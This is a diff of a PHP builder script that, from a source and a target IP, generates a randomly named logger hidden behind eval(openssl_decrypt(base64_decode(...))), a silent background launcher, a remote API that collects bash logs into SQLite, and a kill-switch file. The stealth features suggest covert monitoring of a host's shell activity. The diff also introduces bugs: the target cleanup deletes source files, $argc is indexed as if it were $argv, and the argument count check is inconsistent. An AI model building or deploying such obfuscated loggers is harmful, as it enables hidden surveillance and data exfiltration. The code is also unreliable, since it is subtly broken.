@@ -1,6 +1,6 @@
 <?php
 
-require_once __DIR__ . '/randomAlphaNumericString.php';
+require_once __DIR__ . '/../src/randomAlphaNumericString.php';
 
 if ($argc !== 3) {
     echo 'call this script the following way: php maker.php source-ip target-ip';
@@ -17,37 +17,41 @@ $api = randomAlphaNumericString(12);
 $logger = randomAlphaNumericString(3);
 $key = randomAlphaNumericString(512);
 $protocol = $argv[3] ?? 'http';
-if (!is_dir(__DIR__ . '/dist')) {
-    mkdir(__DIR__ . '/dist');
+
+$out = __DIR__ . '/../dist';
+$in = __DIR__ . '/../src';
+
+if (!is_dir($out)) {
+    mkdir($out);
 }
-if (!is_dir(__DIR__ . '/dist/source')) {
-    mkdir(__DIR__ . '/dist/source');
+if (!is_dir("$out/source")) {
+    mkdir("$out/source");
 } else {
-    foreach (array_diff(scandir(__DIR__ . '/dist/source'), ['.', '..']) as $file) {
-        unlink(__DIR__ . '/dist/source/' . $file);
+    foreach (array_diff(scandir("$out/source"), ['.', '..']) as $file) {
+        unlink("$out/source/$file");
     }
 }
-if (!is_dir(__DIR__ . '/dist/target')) {
-    mkdir(__DIR__ . '/dist/target');
+if (!is_dir("$out/target")) {
+    mkdir("$out/target");
 } else {
-    foreach (array_diff(scandir(__DIR__ . '/dist/target'), ['.', '..']) as $file) {
-        unlink(__DIR__ . '/dist/target/' . $file);
+    foreach (array_diff(scandir("$out/target"), ['.', '..']) as $file) {
+        unlink("$out/source/$file");
     }
 }
-if (!is_dir(__DIR__ . '/dist/home')) {
-    mkdir(__DIR__ . '/dist/home');
+if (!is_dir("$out/home")) {
+    mkdir("$out/home");
 } else {
-    foreach (array_diff(scandir(__DIR__ . '/dist/home'), ['.', '..']) as $file) {
-        unlink(__DIR__ . '/dist/home/' . $file);
+    foreach (array_diff(scandir("$out/home"), ['.', '..']) as $file) {
+        unlink("$out/home/$file");
     }
 }
 
 file_put_contents(
-    __DIR__ . "/dist/source/$logger.php",
+    "$out/source/$logger.php",
     "<?php eval(openssl_decrypt(base64_decode("
         . "'" . openssl_encrypt(
             substr(
-                file_get_contents('randomAlphaNumericString.php'),
+                file_get_contents("$in/randomAlphaNumericString.php"),
                 5
             )
             . "\n"
@@ -55,7 +59,7 @@ file_put_contents(
                 str_replace(
                     ['##KILLKEY##', '##KILLNAME##'],
                     [$killkey, $killName],
-                    file_get_contents('log.php')
+                    file_get_contents("$in/log.php")
                 ),
                 5
             ),
@@ -66,7 +70,7 @@ file_put_contents(
         ) . "'), getenv('LOCAL_CRYPT'), getenv('LOCAL_PASS'), OPENSSL_RAW_DATA, getenv('LOCAL_IV')));"
 );
 file_put_contents(
-    __DIR__ . "/dist/source/$logger.sh",
+    "$out/source/$logger.sh",
     "TARGET_API=$api "
     . "TARGET_PROTOCOL=$protocol "
     . "TARGET_HOST=$target "
@@ -77,11 +81,11 @@ file_put_contents(
     . "php $logger.php &>/dev/null &"
 );
 file_put_contents(
-    __DIR__ . "/dist/target/$api.php",
+    "$out/target/$api.php",
     str_replace(
         ['##SOURCE_HOST##', '##SOURCE_KEY##', '##TARGET_FILTER##', '##DATABASE_CONNECTION##'],
         [$source, $key, $argc[5] ?? 'false', ($argc[4] ?? 'sqlite:/var/log/remote_bash_log.sqlite')],
-        file_get_contents(__DIR__ . '/api.php')
+        file_get_contents("$in/api.php")
     )
 );
-file_put_contents(__DIR__ . "/dist/home/$logger.kill", "export $killName=$killkey");
+file_put_contents("$out/home/$logger.kill", "export $killName=$killkey");
